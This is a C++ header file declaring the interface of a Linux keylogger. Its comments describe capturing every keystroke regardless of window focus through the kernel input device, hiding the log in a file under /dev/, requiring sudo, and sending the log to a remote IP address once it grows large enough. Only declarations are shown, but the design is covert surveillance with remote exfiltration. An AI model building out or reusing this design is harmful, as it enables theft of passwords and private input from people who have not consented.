#ifndef LOGGER_H_
#define LOGGER_H_
#include <iostream>
#include <fstream> 
#include <vector>
#include <regex>
#include <linux/input.h>  //Needed for input_event struct
#include <fcntl.h>	//Needed for open() and O_RDONLY
#include <unistd.h>		//For close()
#include <termios.h> //Needed for struct termios 
#include <errno.h>

namespace logger {

	/**
	 * Gets the list of all devices located in /proc/bus/input/devices
	 * 
	 * @param verbose mode of the program. When true the function produces more details. Default to false.
	 * @return A string that contains all the devices attached to the computer.
	 */
	std::string getDevices(bool verbose=false);

	/**
	 * Uses regular expression to get the handler to the keyboard.
	 * 
	 * @param devices Contains a list of all devices
	 * @return A string that contains the path the keyboard handler
	 */
	std::string getHandler(std::string devices, bool verbose=false);

	/**
	 * Used to determine the existance of a file.
	 * 
	 * @param name The name of a file.
	 * @return true if file exist. false otherwise.
	 */
	bool fileExist (const std::string& name);

	/**
	 * Turns off the ECHO on the console.
	 * 
	 * @param verbose mode of the program. When true the function produces more details. Default to false.
	 * 
	 * Note: If disableEcho is called successfully but not enableEcho, the ECHO will still be disabled after program exits. 
	 */
	void disableEcho(bool verbose=false);

	/**
	 * Re-enables the ECHO on the console.
	 * 
	 * @param verbose mode of the program. When true the function produces more details. Default to false.
	 */
	void enableEcho(bool verbose=false);

	/**
	 * Connects to the handler and captures any keystroke regardless of window focus. Stores the 
	 * any keystroke in a file located at /dev/. 
	 * 
	 * @param handler The path to the keyboard handler
	 * @param verbose mode of the program. When true the function produces more details. Default to false.
	 * 
	 * Note: Does function fails if program not run with sudo.
	 */
	void connectHandler (std::string handler, bool verbose=false);

	/**
	 *  Checks the size of the log file. If it big enough sends file content to the 'server' and clears the file.
	 * 
	 * @param logName Path to the log file.
	 * @param ipAddress The address where the log file content's will be sent to.
	 * @param verbose mode of the program. When true the function produces more details. Default to false.
	 * 
	 * Note: If size of file is not big enough, will not send file.
	 */
	void sendLog (std::string logName, std::string ipAddress, bool verbose=false);

	/**
	 * For Debug mode. List keycode in the array.
	 * 
	 * @param debug Mode of program. When true list contents of internal variables. Defaults to false
	 */
	void debugKeyCode(bool debug=false);
} //namespace: logger
#endif //LOGGER_H_